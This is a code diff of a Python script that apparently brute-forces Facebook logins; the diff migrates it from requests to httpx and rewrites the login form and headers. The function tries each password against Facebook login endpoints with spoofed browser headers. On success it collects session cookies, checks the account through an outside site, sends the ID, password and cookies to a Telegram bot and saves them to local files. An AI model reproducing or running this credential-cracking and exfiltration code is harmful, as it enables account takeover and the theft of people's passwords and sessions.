@@ -1047,65 +1047,38 @@ def m1(ids,pwv):
     warna = random.choice(my_color)
     try:
         for pas in pwv:
-            session = requests.Session()
+            session = httpx.Client()
             free_fb = session.get(f"https://mbasic.facebook.com").text
-            info={
-    "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-    "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-    "try_number": 0,
-    "unrecognized_tries": 0,
-    "email": ids,
-    "prefill_contact_point": ids,
-    "prefill_source": "browser_dropdown",
-    "prefill_type": "contact_point",
-    "first_prefill_source": "browser_dropdown",
-    "first_prefill_type": "contact_point",
-    "had_cp_prefilled": True,
-    "had_password_prefilled": False,
-    "is_smart_lock": False,
-    "bi_xrwh": 0,
-    "encpass": "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),pas),
-    "bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
-    "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),}
-            update= {'Host': 'mbasic.facebook.com',
-    'Content-Length': '1730',
-    'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
-    'Sec-CH-UA-Mobile': '?1',
-    'User-Agent': "Mozilla/5.0 (X11; Linux x86_64 11;  TL-tl; SM-T531) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4445.57 Safari/537.36",
-    'X-Response-Format': 'JSONStream',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'X-FB-LSD': 'AVo_Z7twFKE',
-    'Viewport-Width': '360',
-    'Sec-CH-UA-Platform-Version': '""',
-    'X-Requested-With': 'XMLHttpRequest',
-    'X-ASBD-ID': '129477',
-    'DPR': '2',
-    'Sec-CH-UA-Full-Version-List': '',
-    'Sec-CH-UA-Model': '""',
-    'Sec-CH-Prefers-Color-Scheme': 'light',
-    'Sec-CH-UA-Platform': '"Android"',
-    'Accept': '*/*',
-    'Origin': 'https://mbasic.facebook.com',
-    'Sec-Fetch-Site': 'same-origin',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Dest': 'empty',
-    'Referer': 'https://mbasic.facebook.com/',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'Accept-Language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-            response=session.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = info,headers = update,allow_redirects = False)
+            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+            update= {
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://m.facebook.com/',
+            'DNT': '1',
+            'Pragma': 'no-cache',
+            'TE': 'Trailers', }
+            response=session.post('https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',data = info,headers = update)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                 cid = re.findall('c_user=(.*);xs',kuki)[0]
                 check =f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={cid}"
-                bithi = requests.get(check).text
+                bithi = httpx.get(check).text
                 if 'LIVE' in bithi:
                      print(f'\r\r{rad}[{green}ATOM-OK{rad}]{green} {cid} {rad}▶︎ {green}{pas}')
                      print(f"\r\r{green}COOKIES=[🤖]: {warna}{kuki}\33[1;36m");linex()
                      statusok = (f" {cid} | {pas} | {kuki} ")
                      cek_apk(kuki)
-                     requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+                     httpx.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                      open('/sdcard/ATOM-OK.txt','a').write(cid+'|'+pas+'\n');open('/sdcard/ATOM-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                      oks.append(cid)
                      break
